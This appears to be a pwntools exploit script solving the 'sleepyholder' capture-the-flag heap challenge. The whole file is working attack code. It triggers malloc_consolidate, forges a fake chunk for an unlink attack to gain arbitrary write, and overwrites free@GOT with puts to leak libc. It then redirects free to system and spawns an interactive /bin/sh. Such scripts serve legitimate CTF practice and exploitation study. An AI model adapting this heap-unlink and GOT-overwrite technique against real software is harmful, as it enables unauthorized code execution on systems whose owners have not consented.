from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

file = "./sleepyholder"
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
bin = ELF(file)

conn = process(file)
#gdb.attach(conn)

def keep(level, secret):
    conn.recvuntil("Renew secret");
    conn.sendline("1")
    conn.recvuntil("Big secret")
    conn.sendline(str(level))
    conn.recvuntil("your secret: ")
    conn.send(secret)

def wipe(level):
    conn.recvuntil("Renew secret");
    conn.sendline("2")
    conn.recvuntil("Big secret")
    conn.sendline(str(level))

def renew(level, secret):
    conn.recvuntil("Renew secret");
    conn.sendline("3")
    conn.recvuntil("Big secret")
    conn.sendline(str(level))
    conn.recvuntil("secret: ")
    conn.send(secret)

keep(1, "aa")
keep(2, "aa")
wipe(1) # Goes into fastbin
keep(3, "aa") # Fast chunk goes into unsorted bin(malloc_consolidate) and then small bin (malloc)
wipe(1) # Goes again into fastbin, but prev_in_use of large chunk still 0

small_ptr = 0x6020D0

payload = p64(0) # Prev size
payload += p64(0x20)
payload += p64(small_ptr - 3*8) # fd
payload += p64(small_ptr - 2*8) # bk
payload = payload.ljust(0x20, "\x00")
payload += p64(0x20) # Prev size

keep(1, payload) # Forged fake chunk
wipe(2) # Unlink fake chunk

keep(2, "aa") # We need to renew here

def a_write(addr, data):
    payload = p64(0) + p64(addr)
    renew(1, payload)
    renew(2, data)

a_write(bin.got['free'], p64(bin.symbols['puts']))

renew(1, p64(0) + p64(bin.got['puts']))
wipe(2)
conn.recvn(1)
puts_addr = u64(conn.recvn(6) + "\x00\x00")
system_addr = libc.symbols['system'] - libc.symbols['puts'] + puts_addr

keep(2, "aa")
a_write(bin.got['free'], p64(system_addr))
renew(1, "/bin/sh\x00")
wipe(1)

conn.interactive()
